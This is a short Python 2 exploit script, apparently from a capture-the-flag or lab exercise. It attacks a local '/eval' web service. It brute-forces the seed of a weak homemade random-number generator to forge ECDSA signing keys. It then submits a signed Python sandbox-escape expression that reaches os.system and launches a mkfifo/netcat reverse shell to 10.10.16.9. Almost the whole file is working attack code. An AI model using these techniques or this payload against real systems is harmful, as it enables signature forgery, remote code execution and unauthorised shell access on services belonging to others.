import sys
import random 
import json
import hashlib
import requests
import binascii
from ecdsa import VerifyingKey, SigningKey, NIST384p
from bottle import route, run, request, debug
from bottle import hook
from bottle import response as resp


def secure_rng(seed): 
    # Taken from the internet - probably secure
    p = 2147483647
    g = 2255412

    keyLength = 32
    ret = 0
    ths = round((p-1)/2)
    for i in range(keyLength*8):
        seed = pow(g,seed,p)
        if seed > ths:
            ret += 2**i
    return ret

def verify(msg, sig):
    try:
        return vk.verify(binascii.unhexlify(sig), msg)
    except:
        return False

def sign(msg):
    return binascii.hexlify(sk.sign(msg))

if len(sys.argv) < 2:
    for i in range(0,2000): 
        # Set up the keys
        seed = random.getrandbits(128)
        rand = secure_rng(seed) + 1
        sk = SigningKey.from_secret_exponent(rand, curve=NIST384p)
        vk = sk.get_verifying_key()
        req_data = { 'expr': '2+2', 'sig': sign(str.encode('2+2')) }
        r = requests.post("http://127.0.0.1:81/eval", json=req_data)
        if "Bad signature" in r.text:
            print "Seed not found yet..."
        else:
            print "Seed found!"
            print seed
            break
else:
    seed = int(sys.argv[1])
    rand = secure_rng(seed) + 1
    sk = SigningKey.from_secret_exponent(rand, curve=NIST384p)
    vk = sk.get_verifying_key()
    expr = "[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('" + "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.9 9119 >/tmp/f" + "')"
    req_data = { 'expr': expr, 'sig': sign(str.encode(expr)) }
    r = requests.post("http://127.0.0.1:81/eval", json=req_data)
    print r.text